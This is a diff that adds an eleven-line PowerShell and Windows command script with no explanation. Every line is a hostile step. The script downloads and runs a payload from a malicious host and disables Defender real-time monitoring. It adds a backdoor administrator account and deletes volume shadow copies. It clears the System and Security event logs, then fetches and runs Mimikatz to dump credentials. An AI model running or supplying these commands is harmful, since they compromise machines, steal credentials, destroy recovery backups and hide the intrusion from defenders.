@@ -1,0 +1,11 @@
+Invoke-WebRequest -Uri "http://malicious.com/payload.exe" -OutFile "$env:TEMP\payload.exe"
+Start-Process -FilePath "$env:TEMP\payload.exe" -NoNewWindow
+Set-MpPreference -DisableRealtimeMonitoring $true
+net user backdoor password123 /add
+net localgroup administrators backdoor /add
+vssadmin delete shadows /all /quiet
+wevtutil cl System
+wevtutil cl Security
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/Invoke-Mimikatz.ps1')
+Invoke-Mimikatz -DumpCreds
+Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
